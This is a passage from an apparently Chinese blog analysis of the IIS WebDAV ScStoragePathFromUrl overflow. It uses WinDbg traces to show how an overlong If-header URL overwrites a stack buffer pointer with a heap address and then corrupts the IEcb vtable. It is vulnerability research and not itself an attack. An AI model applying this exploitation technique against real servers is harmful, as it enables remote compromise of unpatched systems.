<span class="n">cs</span><span class="o">=</span><span class="mi">001</span><span class="n">b</span>  <span class="n">ss</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">ds</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">es</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">fs</span><span class="o">=</span><span class="mi">003</span><span class="n">b</span>  <span class="n">gs</span><span class="o">=</span><span class="mi">0000</span>             <span class="n">efl</span><span class="o">=</span><span class="mi">00000202</span>
<span class="n">httpext</span><span class="o">!</span><span class="n">HrCheckIfHeader</span><span class="o">+</span><span class="mh">0xbc</span><span class="o">:</span>
<span class="mi">671253</span><span class="n">e2</span> <span class="n">ffd7</span>            <span class="n">call</span>    <span class="n">edi</span> <span class="o">{</span><span class="n">msvcrt</span><span class="o">!</span><span class="n">wcslen</span> <span class="o">(</span><span class="mi">77</span><span class="n">bd8ef2</span><span class="o">)}</span><span class="err">／／第一次处理</span><span class="n">aaaa部分</span><span class="err">，长度只有</span><span class="n">a7</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">009</span><span class="o">&gt;</span> <span class="n">dc</span> <span class="mi">60</span><span class="n">c64a</span>
<span class="mi">0060</span><span class="n">c64a</span>  <span class="mi">00740068</span> <span class="mi">00700074</span> <span class="mi">002</span><span class="n">f003a</span> <span class="mi">006</span><span class="n">c002f</span>  <span class="n">h</span><span class="o">.</span><span class="na">t</span><span class="o">.</span><span class="na">t</span><span class="o">.</span><span class="na">p</span><span class="o">.:././.</span><span class="n">l</span><span class="o">.</span>
<span class="mi">0060</span><span class="n">c65a</span>  <span class="mi">0063006</span><span class="n">f</span> <span class="mi">006</span><span class="n">c0061</span> <span class="mi">006</span><span class="n">f0068</span> <span class="mi">00740073</span>  <span class="n">o</span><span class="o">.</span><span class="na">c</span><span class="o">.</span><span class="na">a</span><span class="o">.</span><span class="na">l</span><span class="o">.</span><span class="na">h</span><span class="o">.</span><span class="na">o</span><span class="o">.</span><span class="na">s</span><span class="o">.</span><span class="na">t</span><span class="o">.</span>
<span class="mi">0060</span><span class="n">c66a</span>  <span class="mi">0061002</span><span class="n">f</span> <span class="mi">00610061</span> <span class="mi">00610061</span> <span class="mi">00610061</span>  <span class="o">/.</span><span class="n">a</span><span class="o">.</span><span class="na">a</span><span class="o">.</span><span class="na">a</span><span class="o">.</span><span class="na">a</span><span class="o">.</span><span class="na">a</span><span class="o">.</span><span class="na">a</span><span class="o">.</span><span class="na">a</span><span class="o">.</span>
<span class="mi">0060</span><span class="n">c67a</span>  <span class="mi">78636</span><span class="n">f68</span> <span class="mi">71337761</span> <span class="mi">47726936</span> <span class="mi">4</span><span class="n">b777a39</span>  <span class="n">hocxaw3q6irG9zwK</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">009</span><span class="o">&gt;</span> <span class="n">p</span>
<span class="n">eax</span><span class="o">=</span><span class="mi">000000</span><span class="n">a7</span> 
</pre></div>


<p>这个a7长度很小，不会覆盖到gs，因此可以通过security check，但是这个a7却是一个溢出，它超过了stack buffer的长度，会覆盖到stack中关于stack buffer指针的存放位置。这个位置保存在ebp-328的位置。</p>
<div class="codehilite"><pre><span></span><span class="mi">0</span><span class="o">:</span><span class="mi">009</span><span class="o">&gt;</span> <span class="n">p</span>
<span class="n">eax</span><span class="o">=</span><span class="mi">00</span><span class="n">fff800</span> <span class="n">ebx</span><span class="o">=</span><span class="mi">0060</span><span class="n">b508</span> <span class="n">ecx</span><span class="o">=</span><span class="mi">0060</span><span class="n">b508</span> <span class="n">edx</span><span class="o">=</span><span class="mi">00000104</span> <span class="n">esi</span><span class="o">=</span><span class="mi">00000001</span> <span class="n">edi</span><span class="o">=</span><span class="mi">77</span><span class="n">bd8ef2</span>
<span class="n">eip</span><span class="o">=</span><span class="mi">67125479</span> <span class="n">esp</span><span class="o">=</span><span class="mi">00</span><span class="n">fff7b8</span> <span class="n">ebp</span><span class="o">=</span><span class="mi">00</span><span class="n">fffc34</span> <span class="n">iopl</span><span class="o">=</span><span class="mi">0</span>         <span class="n">nv</span> <span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">nz</span> <span class="n">na</span> <span class="n">po</span> <span class="n">nc</span>
<span class="n">cs</span><span class="o">=</span><span class="mi">001</span><span class="n">b</span>  <span class="n">ss</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">ds</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">es</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">fs</span><span class="o">=</span><span class="mi">003</span><span class="n">b</span>  <span class="n">gs</span><span class="o">=</span><span class="mi">0000</span>             <span class="n">efl</span><span class="o">=</span><span class="mi">00000202</span>
<span class="n">httpext</span><span class="o">!</span><span class="n">HrCheckIfHeader</span><span class="o">+</span><span class="mh">0x153</span><span class="o">:</span>
<span class="mi">67125479</span> <span class="n">ffb5e4fdffff</span>    <span class="n">push</span>    <span class="n">dword</span> <span class="n">ptr</span> <span class="o">[</span><span class="n">ebp</span><span class="o">-</span><span class="mi">21</span><span class="n">Ch</span><span class="o">]</span> <span class="n">ss</span><span class="o">:</span><span class="mi">0023</span><span class="o">:</span><span class="mi">00</span><span class="n">fffa18</span><span class="o">=</span><span class="mi">0060</span><span class="n">c828</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">009</span><span class="o">&gt;</span> <span class="n">p</span>
<span class="n">eax</span><span class="o">=</span><span class="mi">00</span><span class="n">fff800</span> <span class="n">ebx</span><span class="o">=</span><span class="mi">0060</span><span class="n">b508</span> <span class="n">ecx</span><span class="o">=</span><span class="mi">0060</span><span class="n">b508</span> <span class="n">edx</span><span class="o">=</span><span class="mi">00000104</span> <span class="n">esi</span><span class="o">=</span><span class="mi">00000001</span> <span class="n">edi</span><span class="o">=</span><span class="mi">77</span><span class="n">bd8ef2</span>
<span class="n">eip</span><span class="o">=</span><span class="mi">6712547</span><span class="n">f</span> <span class="n">esp</span><span class="o">=</span><span class="mi">00</span><span class="n">fff7b4</span> <span class="n">ebp</span><span class="o">=</span><span class="mi">00</span><span class="n">fffc34</span> <span class="n">iopl</span><span class="o">=</span><span class="mi">0</span>         <span class="n">nv</span> <span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">nz</span> <span class="n">na</span> <span class="n">po</span> <span class="n">nc</span>
<span class="n">cs</span><span class="o">=</span><span class="mi">001</span><span class="n">b</span>  <span class="n">ss</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">ds</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">es</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">fs</span><span class="o">=</span><span class="mi">003</span><span class="n">b</span>  <span class="n">gs</span><span class="o">=</span><span class="mi">0000</span>             <span class="n">efl</span><span class="o">=</span><span class="mi">00000202</span>
<span class="n">httpext</span><span class="o">!</span><span class="n">HrCheckIfHeader</span><span class="o">+</span><span class="mh">0x159</span><span class="o">:</span>
<span class="mi">6712547</span><span class="n">f</span> <span class="n">e8cd3fffff</span>      <span class="n">call</span>    <span class="n">httpext</span><span class="o">!</span><span class="n">CMethUtil</span><span class="o">::</span><span class="n">ScStoragePathFromUrl</span> <span class="o">(</span><span class="mi">67119451</span><span class="o">)</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">009</span><span class="o">&gt;</span> <span class="n">dd</span> <span class="n">ebp</span><span class="o">-</span><span class="mi">328</span><span class="err">／／注意拷贝的地址，这个</span><span class="mi">90</span><span class="n">c是scstoragepathfromurl要拷贝的栈地址</span>
<span class="mi">00</span><span class="n">fff90c</span>  <span class="mi">00</span><span class="n">fff804</span> <span class="mi">6711205</span><span class="n">b</span> <span class="mi">00000013</span> <span class="mi">00</span><span class="n">fff9c0</span>
<span class="mi">00</span><span class="n">fff91c</span>  <span class="mi">671287</span><span class="n">e7</span> <span class="mi">00000000</span> <span class="mi">000000</span><span class="n">f0</span> <span class="mi">00000013</span>
</pre></div>


<p>可以看到，第一次ScStoragePathFromUrl的时候，拷贝的地址是一个栈地址，通过stackbuffer申请到的，但是由于memcpy引发的栈溢出，导致这个地方值会被覆盖。</p>
<div class="codehilite"><pre><span></span><span class="mi">0</span><span class="o">:</span><span class="mi">009</span><span class="o">&gt;</span> <span class="n">g</span><span class="c1">//执行结束ScStoragePathFromUrl函数执行返回后</span>
<span class="n">Breakpoint</span> <span class="mi">0</span> <span class="n">hit</span>
<span class="n">eax</span><span class="o">=</span><span class="mi">00</span><span class="n">fff800</span> <span class="n">ebx</span><span class="o">=</span><span class="mi">0060</span><span class="n">b508</span> <span class="n">ecx</span><span class="o">=</span><span class="mi">00605740</span> <span class="n">edx</span><span class="o">=</span><span class="mi">0060</span><span class="n">c828</span> <span class="n">esi</span><span class="o">=</span><span class="mi">00000001</span> <span class="n">edi</span><span class="o">=</span><span class="mi">77</span><span class="n">bd8ef2</span>
<span class="n">eip</span><span class="o">=</span><span class="mi">67126</span><span class="n">c7b</span> <span class="n">esp</span><span class="o">=</span><span class="mi">00</span><span class="n">fff79c</span> <span class="n">ebp</span><span class="o">=</span><span class="mi">00</span><span class="n">fff7ac</span> <span class="n">iopl</span><span class="o">=</span><span class="mi">0</span>         <span class="n">nv</span> <span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">nz</span> <span class="n">na</span> <span class="n">po</span> <span class="n">nc</span>
<span class="n">cs</span><span class="o">=</span><span class="mi">001</span><span class="n">b</span>  <span class="n">ss</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">ds</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">es</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">fs</span><span class="o">=</span><span class="mi">003</span><span class="n">b</span>  <span class="n">gs</span><span class="o">=</span><span class="mi">0000</span>             <span class="n">efl</span><span class="o">=</span><span class="mi">00000202</span>
<span class="n">httpext</span><span class="o">!</span><span class="n">ScStoragePathFromUrl</span><span class="o">:</span>
<span class="mi">67126</span><span class="n">c7b</span> <span class="n">b8150d1467</span>      <span class="n">mov</span>     <span class="n">eax</span><span class="o">,</span><span class="n">offset</span> <span class="n">httpext</span><span class="o">!</span><span class="n">swscanf</span><span class="o">+</span><span class="mh">0x14b5</span> <span class="o">(</span><span class="mi">67140</span><span class="n">d15</span><span class="o">)</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">009</span><span class="o">&gt;</span> <span class="n">g</span>
<span class="n">Breakpoint</span> <span class="mi">3</span> <span class="n">hit</span>
<span class="n">eax</span><span class="o">=</span><span class="mi">00000000</span> <span class="n">ebx</span><span class="o">=</span><span class="mi">0060</span><span class="n">b508</span> <span class="n">ecx</span><span class="o">=</span><span class="mi">00002</span><span class="n">f06</span> <span class="n">edx</span><span class="o">=</span><span class="mi">00</span><span class="n">fff804</span> <span class="n">esi</span><span class="o">=</span><span class="mi">00000001</span> <span class="n">edi</span><span class="o">=</span><span class="mi">77</span><span class="n">bd8ef2</span>
<span class="n">eip</span><span class="o">=</span><span class="mi">67125484</span> <span class="n">esp</span><span class="o">=</span><span class="mi">00</span><span class="n">fff7c0</span> <span class="n">ebp</span><span class="o">=</span><span class="mi">00</span><span class="n">fffc34</span> <span class="n">iopl</span><span class="o">=</span><span class="mi">0</span>         <span class="n">nv</span> <span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">zr</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>
<span class="n">cs</span><span class="o">=</span><span class="mi">001</span><span class="n">b</span>  <span class="n">ss</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">ds</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">es</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">fs</span><span class="o">=</span><span class="mi">003</span><span class="n">b</span>  <span class="n">gs</span><span class="o">=</span><span class="mi">0000</span>             <span class="n">efl</span><span class="o">=</span><span class="mi">00000246</span>
<span class="n">httpext</span><span class="o">!</span><span class="n">HrCheckIfHeader</span><span class="o">+</span><span class="mh">0x15e</span><span class="o">:</span>
<span class="mi">67125484</span> <span class="mi">8</span><span class="n">bf0</span>            <span class="n">mov</span>     <span class="n">esi</span><span class="o">,</span><span class="n">eax</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">009</span><span class="o">&gt;</span> <span class="n">dc</span> <span class="n">fff804</span><span class="err">／／第一次</span><span class="n">memcpy之后</span><span class="err">，覆盖到了</span><span class="mi">90</span><span class="n">c的位置</span>
<span class="mi">00</span><span class="n">fff804</span>  <span class="mi">003</span><span class="n">a0063</span> <span class="mi">0069005</span><span class="n">c</span> <span class="mi">0065006</span><span class="n">e</span> <span class="mi">00700074</span>  <span class="n">c</span><span class="o">.:.\.</span><span class="n">i</span><span class="o">.</span><span class="na">n</span><span class="o">.</span><span class="na">e</span><span class="o">.</span><span class="na">t</span><span class="o">.</span><span class="na">p</span><span class="o">.</span>
<span class="mi">00</span><span class="n">fff814</span>  <span class="mi">00620075</span> <span class="mi">0077005</span><span class="n">c</span> <span class="mi">00770077</span> <span class="mi">006</span><span class="n">f0072</span>  <span class="n">u</span><span class="o">.</span><span class="na">b</span><span class="o">.\.</span><span class="n">w</span><span class="o">.</span><span class="na">w</span><span class="o">.</span><span class="na">w</span><span class="o">.</span><span class="na">r</span><span class="o">.</span><span class="na">o</span><span class="o">.</span>
<span class="mi">00</span><span class="n">fff824</span>  <span class="mi">0074006</span><span class="n">f</span> <span class="mi">0061005</span><span class="n">c</span> <span class="mi">00610061</span> <span class="mi">00610061</span>  <span class="n">o</span><span class="o">.</span><span class="na">t</span><span class="o">.\.</span><span class="n">a</span><span class="o">.</span><span class="na">a</span><span class="o">.</span><span class="na">a</span><span class="o">.</span><span class="na">a</span><span class="o">.</span><span class="na">a</span><span class="o">.</span>
<span class="mi">00</span><span class="n">fff834</span>  <span class="mi">00610061</span> <span class="mi">78636</span><span class="n">f68</span> <span class="mi">71337761</span> <span class="mi">47726936</span>  <span class="n">a</span><span class="o">.</span><span class="na">a</span><span class="o">.</span><span class="na">hocxaw3q6irG</span>
<span class="mi">00</span><span class="n">fff844</span>  <span class="mi">4</span><span class="n">b777a39</span> <span class="mi">75534</span><span class="n">f70</span> <span class="mi">48687</span><span class="n">a4f</span> <span class="mi">6</span><span class="n">d545663</span>  <span class="mi">9</span><span class="n">zwKpOSuOzhHcVTm</span>
<span class="mi">00</span><span class="n">fff854</span>  <span class="mi">39536845</span> <span class="mi">5567506</span><span class="n">c</span> <span class="mi">33646763</span> <span class="mi">78454630</span>  <span class="n">EhS9lPgUcgd30FEx</span>
<span class="mi">00</span><span class="n">fff864</span>  <span class="mi">54316952</span> <span class="mi">6</span><span class="n">a514c58</span> <span class="mi">42317241</span> <span class="mi">58507035</span>  <span class="n">Ri1TXLQjAr1B5pPX</span>
<span class="mi">00</span><span class="n">fff874</span>  <span class="mi">6</span><span class="n">c473664</span> <span class="mi">546</span><span class="n">a3539</span> <span class="mi">54435034</span> <span class="mi">50617752</span>  <span class="n">d6Gl95jT4PCTRwaP</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">009</span><span class="o">&gt;</span> <span class="n">dd</span> <span class="n">fff900</span>
<span class="mi">00</span><span class="n">fff900</span>  <span class="mi">5</span><span class="n">a306272</span> <span class="mi">54485938</span> <span class="mi">02020202</span> <span class="mi">680312</span><span class="n">c0</span>
</pre></div>


<p>经过这次stack buffer overflow，这个值已经被覆盖，覆盖成了一个堆地址0x680312c0。接下来进入第二次调用。</p>
<div class="codehilite"><pre><span></span><span class="mi">0</span><span class="o">:</span><span class="mi">009</span><span class="o">&gt;</span> <span class="n">p</span>
<span class="n">eax</span><span class="o">=</span><span class="mi">00</span><span class="n">fff910</span> <span class="n">ebx</span><span class="o">=</span><span class="mi">0060</span><span class="n">b508</span> <span class="n">ecx</span><span class="o">=</span><span class="mi">00000410</span> <span class="n">edx</span><span class="o">=</span><span class="mi">00000000</span> <span class="n">esi</span><span class="o">=</span><span class="mi">0060</span><span class="n">d32a</span> <span class="n">edi</span><span class="o">=</span><span class="mi">77</span><span class="n">bd8ef2</span>
<span class="n">eip</span><span class="o">=</span><span class="mi">671253</span><span class="n">e2</span> <span class="n">esp</span><span class="o">=</span><span class="mi">00</span><span class="n">fff7bc</span> <span class="n">ebp</span><span class="o">=</span><span class="mi">00</span><span class="n">fffc34</span> <span class="n">iopl</span><span class="o">=</span><span class="mi">0</span>         <span class="n">nv</span> <span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">nz</span> <span class="n">na</span> <span class="n">po</span> <span class="n">nc</span>
<span class="n">cs</span><span class="o">=</span><span class="mi">001</span><span class="n">b</span>  <span class="n">ss</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">ds</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">es</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">fs</span><span class="o">=</span><span class="mi">003</span><span class="n">b</span>  <span class="n">gs</span><span class="o">=</span><span class="mi">0000</span>             <span class="n">efl</span><span class="o">=</span><span class="mi">00000202</span>
<span class="n">httpext</span><span class="o">!</span><span class="n">HrCheckIfHeader</span><span class="o">+</span><span class="mh">0xbc</span><span class="o">:</span>
<span class="mi">671253</span><span class="n">e2</span> <span class="n">ffd7</span>            <span class="n">call</span>    <span class="n">edi</span> <span class="o">{</span><span class="n">msvcrt</span><span class="o">!</span><span class="n">wcslen</span> <span class="o">(</span><span class="mi">77</span><span class="n">bd8ef2</span><span class="o">)}</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">009</span><span class="o">&gt;</span> <span class="n">dc</span> <span class="mi">60</span><span class="n">d32a</span>
<span class="mi">0060</span><span class="n">d32a</span>  <span class="mi">00740068</span> <span class="mi">00700074</span> <span class="mi">002</span><span class="n">f003a</span> <span class="mi">006</span><span class="n">c002f</span>  <span class="n">h</span><span class="o">.</span><span class="na">t</span><span class="o">.</span><span class="na">t</span><span class="o">.</span><span class="na">p</span><span class="o">.:././.</span><span class="n">l</span><span class="o">.</span>
<span class="mi">0060</span><span class="n">d33a</span>  <span class="mi">0063006</span><span class="n">f</span> <span class="mi">006</span><span class="n">c0061</span> <span class="mi">006</span><span class="n">f0068</span> <span class="mi">00740073</span>  <span class="n">o</span><span class="o">.</span><span class="na">c</span><span class="o">.</span><span class="na">a</span><span class="o">.</span><span class="na">l</span><span class="o">.</span><span class="na">h</span><span class="o">.</span><span class="na">o</span><span class="o">.</span><span class="na">s</span><span class="o">.</span><span class="na">t</span><span class="o">.</span>
<span class="mi">0060</span><span class="n">d34a</span>  <span class="mi">0062002</span><span class="n">f</span> <span class="mi">00620062</span> <span class="mi">00620062</span> <span class="mi">00620062</span>  <span class="o">/.</span><span class="n">b</span><span class="o">.</span><span class="na">b</span><span class="o">.</span><span class="na">b</span><span class="o">.</span><span class="na">b</span><span class="o">.</span><span class="na">b</span><span class="o">.</span><span class="na">b</span><span class="o">.</span><span class="na">b</span><span class="o">.</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">009</span><span class="o">&gt;</span> <span class="n">p</span>
<span class="n">eax</span><span class="o">=</span><span class="mi">0000030</span><span class="n">d</span>
</pre></div>


<p>第二次获得http://localhost/bbbbb ...的长度，这个长度有0x30d，非常长，但是对应保存的位置变了。</p>
<div class="codehilite"><pre><span></span><span class="mi">0</span><span class="o">:</span><span class="mi">009</span><span class="o">&gt;</span> <span class="n">p</span>
<span class="n">eax</span><span class="o">=</span><span class="mi">00</span><span class="n">fff800</span> <span class="n">ebx</span><span class="o">=</span><span class="mi">0060</span><span class="n">b508</span> <span class="n">ecx</span><span class="o">=</span><span class="mi">00</span><span class="n">fff800</span> <span class="n">edx</span><span class="o">=</span><span class="mi">000002</span><span class="n">fe</span> <span class="n">esi</span><span class="o">=</span><span class="mi">00000000</span> <span class="n">edi</span><span class="o">=</span><span class="mi">77</span><span class="n">bd8ef2</span>
<span class="n">eip</span><span class="o">=</span><span class="mi">67125436</span> <span class="n">esp</span><span class="o">=</span><span class="mi">00</span><span class="n">fff7c0</span> <span class="n">ebp</span><span class="o">=</span><span class="mi">00</span><span class="n">fffc34</span> <span class="n">iopl</span><span class="o">=</span><span class="mi">0</span>         <span class="n">nv</span> <span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">nz</span> <span class="n">na</span> <span class="n">po</span> <span class="n">nc</span>
<span class="n">cs</span><span class="o">=</span><span class="mi">001</span><span class="n">b</span>  <span class="n">ss</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">ds</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">es</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">fs</span><span class="o">=</span><span class="mi">003</span><span class="n">b</span>  <span class="n">gs</span><span class="o">=</span><span class="mi">0000</span>             <span class="n">efl</span><span class="o">=</span><span class="mi">00000202</span>
<span class="n">httpext</span><span class="o">!</span><span class="n">HrCheckIfHeader</span><span class="o">+</span><span class="mh">0x110</span><span class="o">:</span>
<span class="mi">67125436</span> <span class="mi">50</span>              <span class="n">push</span>    <span class="n">eax</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">009</span><span class="o">&gt;</span> <span class="n">p</span>
<span class="n">eax</span><span class="o">=</span><span class="mi">00</span><span class="n">fff800</span> <span class="n">ebx</span><span class="o">=</span><span class="mi">0060</span><span class="n">b508</span> <span class="n">ecx</span><span class="o">=</span><span class="mi">00</span><span class="n">fff800</span> <span class="n">edx</span><span class="o">=</span><span class="mi">000002</span><span class="n">fe</span> <span class="n">esi</span><span class="o">=</span><span class="mi">00000000</span> <span class="n">edi</span><span class="o">=</span><span class="mi">77</span><span class="n">bd8ef2</span>
<span class="n">eip</span><span class="o">=</span><span class="mi">67125437</span> <span class="n">esp</span><span class="o">=</span><span class="mi">00</span><span class="n">fff7bc</span> <span class="n">ebp</span><span class="o">=</span><span class="mi">00</span><span class="n">fffc34</span> <span class="n">iopl</span><span class="o">=</span><span class="mi">0</span>         <span class="n">nv</span> <span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">nz</span> <span class="n">na</span> <span class="n">po</span> <span class="n">nc</span>
<span class="n">cs</span><span class="o">=</span><span class="mi">001</span><span class="n">b</span>  <span class="n">ss</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">ds</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">es</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">fs</span><span class="o">=</span><span class="mi">003</span><span class="n">b</span>  <span class="n">gs</span><span class="o">=</span><span class="mi">0000</span>             <span class="n">efl</span><span class="o">=</span><span class="mi">00000202</span>
<span class="n">httpext</span><span class="o">!</span><span class="n">HrCheckIfHeader</span><span class="o">+</span><span class="mh">0x111</span><span class="o">:</span>
<span class="mi">67125437</span> <span class="n">ffb5d8fcffff</span>    <span class="n">push</span>    <span class="n">dword</span> <span class="n">ptr</span> <span class="o">[</span><span class="n">ebp</span><span class="o">-</span><span class="mi">328</span><span class="n">h</span><span class="o">]</span> <span class="n">ss</span><span class="o">:</span><span class="mi">0023</span><span class="o">:</span><span class="mi">00</span><span class="n">fff90c</span><span class="o">=</span><span class="mi">680312</span><span class="n">c0</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">009</span><span class="o">&gt;</span> <span class="n">dc</span> <span class="n">ebp</span><span class="o">-</span><span class="mi">328</span>
<span class="mi">00</span><span class="n">fff90c</span>  <span class="mi">680312</span><span class="n">c0</span> <span class="mi">52566</span><span class="n">c44</span> <span class="mi">6</span><span class="n">c6d4b37</span> <span class="mi">585</span><span class="n">a4f58</span>  <span class="o">...</span><span class="n">hDlVR7KmlXOZX</span>
<span class="mi">00</span><span class="n">fff91c</span>  <span class="mi">496</span><span class="n">a7950</span> <span class="mi">4</span><span class="n">a52584f</span> <span class="mi">664</span><span class="n">d4150</span> <span class="mi">680313</span><span class="n">c0</span>  <span class="n">PyjIOXRJPAMf</span><span class="o">...</span><span class="n">h</span>
<span class="mi">00</span><span class="n">fff92c</span>  <span class="mi">65314834</span> <span class="mi">6</span><span class="n">e666f43</span> <span class="mi">436</span><span class="n">c7441</span> <span class="mi">680313</span><span class="n">c0</span>  <span class="mi">4</span><span class="n">H1eCofnAtlC</span><span class="o">...</span><span class="n">h</span>
<span class="mi">00</span><span class="n">fff93c</span>  <span class="mi">6</span><span class="n">a415343</span> <span class="mi">33307052</span> <span class="mi">424</span><span class="n">c5866</span> <span class="mi">6346704</span><span class="n">b</span>  <span class="n">CSAjRp03fXLBKpFc</span>

<span class="mi">0</span><span class="o">:</span><span class="mi">009</span><span class="o">&gt;</span> <span class="n">dd</span> <span class="mi">680312</span><span class="n">c0</span><span class="err">／／要用到的堆地址，这个地址会在最后用到</span>
<span class="mi">680312</span><span class="n">c0</span>  <span class="mi">00000000</span> <span class="mi">00000000</span> <span class="mi">00000000</span> <span class="mi">00000000</span>
<span class="mi">680312</span><span class="n">d0</span>  <span class="mi">00000000</span> <span class="mi">00000000</span> <span class="mi">00000000</span> <span class="mi">00000000</span>
<span class="mi">680312</span><span class="n">e0</span>  <span class="mi">00000000</span> <span class="mi">00000000</span> <span class="mi">00000000</span> <span class="mi">00000000</span>
</pre></div>


<p>可以看到，第二次利用的时候，会把ebp-328这个地方的值推入栈中，这个地方应该是stack buffer的地址，应该是个栈地址，但是现在变成了堆地址，就是由于第一次栈溢出，覆盖了这个变量。</p>
<p>而这个值，会作为参数传入ScStorageFromUrl函数，作为memcpy拷贝的值。</p>
<p>这也就解释了为什么我们在上面分析漏洞的时候，会是向堆地址拷贝，而这一次拷贝，就不需要控制长度了，因为这个地方的值已经是堆地址，再怎么覆盖，也不会覆盖到cookie。这里未来要覆盖IEcb虚表结构。从而达到漏洞利用。这样，第二次向堆地址拷贝之后，这个堆地址会覆盖到IEcb的虚表，这个虚表结构会在最后利用时引用到。</p>
<p>在PoC中，有一处<locktoken>，这个会触发漏洞利用，是在CheckIfHeader之后到达位置，在CheckIfHeader的PszToken函数判断没有&lt;&gt;的http url之后，break掉，之后进入lock token处理。</locktoken></p>
<div class="codehilite"><pre><span></span><span class="mi">0</span><span class="o">:</span><span class="mi">009</span><span class="o">&gt;</span> <span class="n">p</span>
<span class="n">eax</span><span class="o">=</span><span class="mi">67140</span><span class="n">d15</span> <span class="n">ebx</span><span class="o">=</span><span class="mi">00</span><span class="n">fffbe8</span> <span class="n">ecx</span><span class="o">=</span><span class="mi">680313</span><span class="n">c0</span> <span class="n">edx</span><span class="o">=</span><span class="mi">0060</span><span class="n">e7b0</span> <span class="n">esi</span><span class="o">=</span><span class="mi">00</span><span class="n">fffc28</span> <span class="n">edi</span><span class="o">=</span><span class="mi">00000104</span>
<span class="n">eip</span><span class="o">=</span><span class="mi">67126</span><span class="n">c80</span> <span class="n">esp</span><span class="o">=</span><span class="mi">00</span><span class="n">fff940</span> <span class="n">ebp</span><span class="o">=</span><span class="mi">00</span><span class="n">fff950</span> <span class="n">iopl</span><span class="o">=</span><span class="mi">0</span>         <span class="n">nv</span> <span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">nz</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>
<span class="n">cs</span><span class="o">=</span><span class="mi">001</span><span class="n">b</span>  <span class="n">ss</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">ds</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">es</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">fs</span><span class="o">=</span><span class="mi">003</span><span class="n">b</span>  <span class="n">gs</span><span class="o">=</span><span class="mi">0000</span>             <span class="n">efl</span><span class="o">=</span><span class="mi">00000206</span>
<span class="n">httpext</span><span class="o">!</span><span class="n">ScStoragePathFromUrl</span><span class="o">+</span><span class="mh">0x5</span><span class="o">:</span>
<span class="mi">67126</span><span class="n">c80</span> <span class="n">e803100000</span>      <span class="n">call</span>    <span class="n">httpext</span><span class="o">!</span><span class="n">_EH_prolog</span> <span class="o">(</span><span class="mi">67127</span><span class="n">c88</span><span class="o">)</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">009</span><span class="o">&gt;</span> <span class="n">kb</span>
<span class="n">ChildEBP</span> <span class="n">RetAddr</span>  <span class="n">Args</span> <span class="n">to</span> <span class="n">Child</span>              
<span class="mi">00</span><span class="n">fff93c</span> <span class="mi">67119469</span> <span class="mi">00</span><span class="n">fffab4</span> <span class="mi">00</span><span class="n">fff9a4</span> <span class="mi">00000000</span> <span class="n">httpext</span><span class="o">!</span><span class="n">ScStoragePathFromUrl</span><span class="o">+</span><span class="mh">0x5</span>
<span class="mi">00</span><span class="n">fff950</span> <span class="mi">67125740</span> <span class="mi">0060</span><span class="n">e7b0</span> <span class="mi">00</span><span class="n">fffab4</span> <span class="mi">00</span><span class="n">fff9a4</span> <span class="n">httpext</span><span class="o">!</span><span class="n">CMethUtil</span><span class="o">::</span><span class="n">ScStoragePathFromUrl</span><span class="o">+</span><span class="mh">0x18</span>
<span class="mi">00</span><span class="n">fffbd0</span> <span class="mi">664</span><span class="n">d4150</span> <span class="mi">680313</span><span class="n">c0</span> <span class="mi">65314834</span> <span class="mi">6</span><span class="n">e666f43</span> <span class="n">httpext</span><span class="o">!</span><span class="n">CParseLockTokenHeader</span><span class="o">::</span><span class="n">HrGetLockIdForPath</span>
<span class="o">+</span><span class="mh">0x119</span>
<span class="n">WARNING</span><span class="o">:</span> <span class="n">Frame</span> <span class="n">IP</span> <span class="n">not</span> <span class="k">in</span> <span class="n">any</span> <span class="n">known</span> <span class="n">module</span><span class="o">.</span> <span class="n">Following</span> <span class="n">frames</span> <span class="n">may</span> <span class="n">be</span> <span class="n">wrong</span><span class="o">.</span>
